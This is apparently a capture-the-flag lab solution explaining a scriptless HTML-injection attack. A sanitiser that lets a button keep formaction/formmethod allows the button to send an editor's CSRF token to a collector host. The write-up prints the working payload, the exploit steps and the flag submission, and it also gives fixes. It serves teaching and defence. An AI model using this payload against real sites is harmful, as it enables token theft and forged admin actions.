# Solution — HTML5 formaction Attribute Injection

## Vulnerability class

**CWE-79 · OWASP A03:2021 – Injection** — an HTML-injection (XSS-family) bug in
its **scriptless** form: no JavaScript executes. An allow-list sanitiser permits a
`<button>` to keep the HTML5 `formaction`/`formmethod` attributes, which override
the submit target of the form the button lives in. Injected into the editor's
CSRF-token-bearing approve form and activated by the editor's click, that button
exfiltrates the token to an attacker origin.

## The sink

`GET /admin/review` renders a contributor draft **inside** the approve form:

```python
'<form method="post">'                                   # no action → posts to current URL
'<input type="hidden" name="csrf" value="%s">'           # the editor's CSRF token
'<input type="hidden" name="block_id" value="%s">'
'<div class="draft">%s</div>'                            # the sanitised draft
'<button type="submit" name="decision" value="approve">Approve draft</button>'
'</form>'
```

The draft HTML is the sanitiser's output, inserted verbatim. So whatever the
sanitiser lets through becomes a real element **inside the form**, next to the
hidden CSRF token.

## The sanitiser is genuinely good — except for two attributes

The app uses nh3 (ammonia) with an explicit allow-list:

```python
SANITISE_TAGS  = {..., "a", "button"}
SANITISE_ATTRS = {
    "a": {"href", "title"},
    "button": {"type", "class", "name", "value", "formaction", "formmethod"},  # the flaw
}
nh3.clean(html, tags=SANITISE_TAGS, attributes=SANITISE_ATTRS)
```

This is not a toy filter. Verify what it does to the obvious attacks:

| Draft you submit                                                                  | After `nh3.clean`                    |
| --------------------------------------------------------------------------------- | ------------------------------------ |
| `<script>steal()</script>hi`                                                      | `hi`                                 |
| `<img src=x onerror="steal()">`                                                   | _(removed entirely)_                 |
| `<a href="javascript:steal()">x</a>`                                              | `<a rel="noopener noreferrer">x</a>` |
| `<button onclick="steal()">x</button>`                                            | `<button>x</button>`                 |
| `<button formaction="javascript:steal()">x`                                       | `<button>x</button>`                 |
| `<button formaction="http://collector:9000/report" formmethod="post">Go</button>` | **unchanged**                        |

Scripts, event handlers and `javascript:` URIs — including a `javascript:`
_formaction_ — are all stripped. The **only** thing that survives is a `<button>`
carrying `formaction`/`formmethod` pointing at an `http(s)` origin. That is the
whole attack surface, and it needs no script.

## What formaction does

In HTML5, a submit control (`<button type=submit>`, `<input type=image>`) may
carry `formaction` and `formmethod`. When _that specific control_ submits the
form, its `formaction` **overrides the form's `action`** and its `formmethod`
overrides the form's `method`. The approve form has no `action`, so it normally
posts to the current URL (`/admin/review`). A button with
`formaction="http://collector:9000/report"` makes _its_ click post the form
**there** instead — carrying every field in the form, the hidden `csrf` token
included.

Same-origin policy does not help the defender: an HTML form may post cross-origin
freely (that is why CSRF tokens exist in the first place). The browser sends the
POST; we do not need to read the response.

## Why the editor's click is the delivery

`formaction` only takes effect when its button is the one that submits. In a real
attack you social-engineer the click, overlay the real button, or use an
`autofocus` button plus an Enter keypress. Here the editor's _review workflow is
to click the CTA_: the shared verifier bot is configured
`XSSBOT_CLICK_SELECTOR=.draft button`, so it clicks the draft's button to preview
it. The injected `formaction` button sits alone in `.draft` (the legitimate
"Approve draft" button is outside it), so the bot clicks exactly our button and
the approve form goes to the collector.

## Why you can't just read the token

```
GET /admin/review              → 403 (no editor cookie)
GET /internal/bot-login?k=…    → 403 from the public side (backend subnet + BOT_KEY)
```

You never load `/admin/review`, so you never see the token. The editor's browser
sees it — and its click hands it to you.

## The payload and end-to-end

```
# 1. Plant a draft whose CTA button overrides the form target:
POST /blocks
{"html":"<p>Please approve our new campaign.</p>
         <button type=\"submit\" formaction=\"http://collector:9000/report\"
                 formmethod=\"post\">Approve draft</button>"}

# 2. Wait ~2s. The editor bot loads /admin/review, clicks .draft button; the
#    approve form (with its CSRF token) posts to the collector.

# 3. Read what the collector captured (app-side proxy):
GET /oob/received      # a POST item whose body is  csrf=<32 hex>&block_id=b1

# 4. Submit the token:
POST /solve   {"c":"<32 hex>"}      →  FLAG{…}
```

`tests/exploit.py` automates this and also plants the **negative control** — an
`<img onerror>` + `<script>` stealer — to demonstrate it yields **zero** beacons:
the sanitiser is real, and the scriptless formaction override is the only way
through.

## Why the containment holds

- The collector and editor bot live on a `backend` network with `internal: true`
  — **no route off the host**. The stolen token reaches the in-lab collector but
  never the internet, so the lab ships a real exfiltration primitive at
  `risk: low`.
- `/internal/bot-login` is firewalled to the backend subnet **and** gated by a
  `BOT_KEY`, so a public visitor cannot mint the editor cookie and read the token.
- `/admin/review` and `POST /admin/review` require the editor session; the CSRF
  token gates the approve action, which is exactly why stealing it matters.
- Single gunicorn worker: the draft store and the editor session/CSRF live
  in-process, so the bot and the exploit see one consistent state.

## The fix

1. **Drop `formaction`/`formmethod` from the allow-list — the real fix.** They are
   not styling attributes; they change form control flow. A CTA button never needs
   them. Removing them from `SANITISE_ATTRS["button"]` closes the hole while
   keeping the styled button:

   ```python
   "button": {"type", "class"},   # no formaction / formmethod / name / value
   ```

   Allow-lists must be reasoned about by **attribute semantics**, not just "is this
   a known attribute" — `formaction`, `form`, `srcdoc`, `xlink:href`, `style` and
   the `on*` handlers all carry behaviour, not just presentation.

2. **Don't render untrusted markup inside a security-sensitive form.** Even with a
   perfect sanitiser, rendering attacker HTML _inside_ the form that holds the
   CSRF token is asking for trouble (dangling-markup and form-splitting variants).
   Render drafts in an isolated, sandboxed context (a `sandbox`ed iframe, or a
   separate origin) so injected markup cannot reach the form.

3. **Note what does _not_ fix it.** Marking the session cookie `HttpOnly` and
   setting a strict `script-src` CSP do **nothing** here: there is no
   `document.cookie` read and no script to block. The secret is a form field and
   the exfiltration is a plain form submit. Defences must match the actual vector —
   a `form-action` **CSP directive** (`form-action 'self'`) _would_ independently
   block this by forbidding the form from submitting cross-origin; that plus the
   allow-list fix is defence in depth.

## Deviation from the catalog stack

The reference scenario is a **Node/NestJS** CMS that sanitises rich text with
**DOMPurify** in an older, permissive configuration (behind nginx, PostgreSQL,
reviewed by a Puppeteer bot). This lab **re-platforms it to Flask** and uses
**nh3** — a modern, well-tested allow-list sanitiser — configured with the exact
same gap (`<button>` keeps `formaction`/`formmethod`). Using a real sanitiser
matters: it proves the bug is the _allow-list decision_, not a weak filter, and
that no script-injection shortcut exists. The taught vulnerability (scriptless
form-target hijack via a permitted attribute, delivered on a reviewer's click) is
identical on either stack; DOMPurify, NestJS, nginx and PostgreSQL are incidental
plumbing. The Playwright verifier stands in for Puppeteer with the same
click-delivery behaviour.
